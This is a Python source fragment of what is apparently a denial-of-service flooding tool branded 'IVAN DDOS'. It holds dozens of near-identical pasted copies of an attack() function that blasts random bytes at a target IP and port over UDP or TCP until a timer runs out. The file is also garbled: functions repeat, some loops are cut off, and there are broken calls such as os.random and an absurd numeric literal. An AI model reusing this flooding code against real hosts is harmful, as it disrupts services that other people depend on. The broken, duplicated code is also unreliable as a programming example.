        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

